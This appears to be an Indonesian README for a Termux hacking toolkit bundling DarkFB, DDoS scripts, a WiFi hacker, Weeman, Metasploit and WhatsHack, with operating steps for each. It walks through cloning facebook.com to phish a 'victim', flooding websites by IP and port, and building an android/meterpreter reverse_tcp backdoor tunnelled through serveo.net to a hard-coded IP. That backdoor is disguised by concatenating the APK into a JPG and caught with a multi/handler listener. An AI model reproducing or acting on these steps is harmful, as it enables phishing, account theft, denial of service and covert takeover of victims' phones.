ArufiToolsv1

pkg update && pkg upgrade
pkg install git
pkg install nano
git hub https://github.com/Mr_AnonyWolf/ArufiToolsv1
cd Mr_AnonyWolf
chmod 755 ArufiToolsv1.sh
sh ArufiToolsv1.sh

Terdapat tools didalamnya diantaranya
-DarkFB king
-DDos attack 1-Liteddos
             2-Hammer
             3-Torshammer
-Wifi hacker
-Red Hawk
-Weeman
-Metasploit Framework
-Whatshack

Cara menjalankannya setelah diinstall

1- DarkFB king
              cd DARK_KING
              nano login.txt untuk menyimpan token facebook cari aja digoogle cara dapat token fbnya
              setelah dicopy paste terus ctrl+s dan ctrl+x
              chmod 755 dog.py
              python2 dog.py
              Tanpa token kamu akan kena checkpoint

2- DDOS ATTACK
              1- Liteddos
                         cd LITEDDOS
                         python2 LITEDDOS.py -nama ip -nama port(default 80) -banyak paket(default 135)

              2- Hammer
                       cd hammer
                       chmod 755 hammer.py
                       python hammer.py -nama ip -nama port(default 80) -banyak paket(default 135)
  
   untuk mencari ip website tinggal ketik
   ping (alamat website/url website)
   ctrl+c(^C) untuk memberhentikan ping

3- Wifi Hacker
              cd wifi-hacker
              sh wifi-hacker.sh

4- Red Hawk
           cd RED_HAWK
           php rhawk.php
           ketik nama website www.(nama website).com jangan memakai http:// atau https://
           lalu pilih http atau https tergantung website yang memakainya
           
5- Weeman
         cd weeman
         chmod 755 weeman.py
         python2 weeman.py
         ketikkan nama website untuk diclone contoh set url  https://www.facebook.com
         ketik lagi nama website yang sama dengan set action_url
         show
         buka new session untuk lembar baru
         ketik ifconfig dilembar baru
         balik lagi ke lembar weeman terus run
         copy addressnya ke korban
         tunggu sampai korban login
         
6- Metasploit Framework
                       chmod +× metasploit.sh
                       ./metasploit.sh (jika mau menjalankan lagi setelah chmod)
                       
                       untuk membuat backdoor harus koneksi ke server dulu
                       >ssh -R <public-port>:localhost:<local-port> serveo.net
                       contoh
                       >ssh -R 3387:localhost:4444 serveo.net
                       @ sampai muncul tulisan hijau : Forwarding TCP connections from serveo.net:3387
                       
                       setelah itu ping serveo.net nya apakah merespon atau tidak. pencet new session
                       ping serveo.net

                       sekarang buat backdoornya. lanjut ke new session yang baru lagi
                       termux-setup-sdcard (untuk mengizinkan akses sdcard)
                       msfvenom -p android/meterpreter/reverse_tcp LHOST=159.89.214.31 LPORT=3387 -o $HOME/backdoor.apk
                       
                       jika telah diinstall, maka copy gambar file.jpg ke termux
                       contoh
                       cd /sdcard/DOWNLOAD
                       cp -R images.jpg $HOME
                       cd

                       sekarang tinggal satukan backdoor aplikasi dengan images.jpg
                       cat images.jpg backdoor.apk > namaimages.jpg
                       
                       setelah berhasil bikin payload images, sekarang tinggal lancarkan penyerangannya
                       msfconsole
                       msf5 > use exploit/multi/handler
                       msf5 > set payload android/meterpreter/reverse_tcp
                       msf5 > set LHOST 0.0.0.0
                       msf5 > set LPORT 4444
                       msf5 > run
                       > open payload imagesnya
                       meterpreter > ...

                       jika ssh tidak bisa tersambung ke meterpreter, gunakan ngrok

7- Whatshack
            cd whatshack
            chmod 755 whatshack.sh
            sh whatshack.sh
            no hpmu dan no target

            tunggu proses sampai 5-10 menit
            jika tidak work atau lama, perhatikan/cek jaringan anda lalu coba lagi atau tunggu saja sampai dapat

Control(CTRL)+c untuk menghentikan script/animasi secara manual

*Developed by MrAnonyWolf  
